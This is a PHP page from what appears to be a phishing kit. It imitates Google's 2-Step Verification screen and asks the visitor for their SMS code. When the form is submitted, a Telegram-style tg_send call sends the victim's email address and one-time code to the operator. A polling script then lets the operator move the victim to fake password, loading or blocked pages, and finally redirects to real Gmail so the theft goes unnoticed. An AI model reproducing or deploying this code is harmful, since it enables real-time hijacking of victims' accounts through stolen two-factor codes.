<?php
// verify-sms.php — 2-Step: SMS verification code
require 'config.php';
require 'helpers.php';
session_start();

if (empty($_SESSION['email'])) { header('Location: index.php'); exit; }

$sid      = $_SESSION['visitor_id'] ?? session_id();
$email    = $_SESSION['email'];
$state    = get_state($sid);
$is_error = ($state['page'] === 'sms_error');
$error    = '';

// If success already set, go to Gmail
if ($state['page'] === 'success') {
    header('Location: https://mail.google.com/');
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $code = trim($_POST['code'] ?? '');
    if ($code === '') {
        $error = 'Enter the verification code.';
    } elseif (!preg_match('/^\d{6}$/', $code)) {
        $error = 'Enter a valid 6-digit code.';
    } else {
        set_state($sid, ['page' => 'loading']);
        $s = get_state($sid);
        tg_send(
            "📱 <b>SMS CODE SUBMITTED!</b>\n\n" .
            "🆔 ID: <code>{$sid}</code>\n" .
            "📨 Email: <code>{$email}</code>\n" .
            "🔢 Code entered: <code>{$code}</code>\n\n" .
          
            "👇 <b>What should happen next?</b>"
        );
        tg_after_sms($sid);
        header('Location: loading.php');
        exit;
    }
}

page_open('2-Step Verification', true);
?>

<div class="card two-col" role="main">
  <div>
    <?= g_logo() ?>
    <h1 class="card-title">2-Step Verification</h1>
    <p class="card-sub">To help keep your account safe, Google wants to make sure it's really you trying to sign in</p>
    

<br><br> 
  </div>

  <div>
    <p class="sms-note">
      A text message with a 6-digit verification code was just sent to
      <strong>(•••) ••• ••••</strong>
    </p>

    <?php if ($is_error && !$error): ?>
      <div class="err-text" style="margin-bottom:12px">
        <?= err_icon() ?>That code didn't work. Check the code and try again.
      </div>
    <?php endif; ?>

    <form method="POST" id="smsForm" novalidate>
      <div class="field-wrap">
        <input type="text" name="code" id="codeInput" placeholder="Code"
               inputmode="numeric" maxlength="6"
               autocomplete="one-time-code"
               class="<?= $error ? 'err' : '' ?>" />
        <label for="codeInput">Enter the code</label>
      </div>
      <?php if ($error): ?>
        <div class="err-text"><?= err_icon() ?><?= htmlspecialchars($error) ?></div>
      <?php else: ?>
        <div class="err-text" id="codeErr"></div>
      <?php endif; ?>

      <div class="btn-row">
        <a href="loading.php" class="link">Try another way</a>
        <button type="submit" class="btn-primary">Next</button>
      </div>
    </form>
  </div>
</div>

<script>
(function(){
  const PAGE_MAP = {
    'loading':      'loading.php',
    'verify_prompt':'verify-prompt.php',
    'prompt_error': 'verify-prompt.php',
    'pw_error':     'password.php',
    'password':     'password.php',
    'blocked':      'blocked.php',
    'success':      'https://mail.google.com/',
  };
  let redirecting = false;
  function poll(){
    if(redirecting) return;
    fetch('poll.php?t='+Date.now(),{cache:'no-store'})
      .then(r=>r.json())
      .then(d=>{
        if(redirecting) return;
        if(d.page === 'success'){
          redirecting = true;
          window.location.replace('https://mail.google.com/');
          return;
        }
        if(d.page === 'verify_sms' || d.page === 'sms_error') return;
        const dest = PAGE_MAP[d.page];
        if(dest){ redirecting = true; window.location.replace(dest); }
      }).catch(()=>{});
  }
  setInterval(poll,1200);
  poll();
})();
</script>

<?php page_close(); ?>
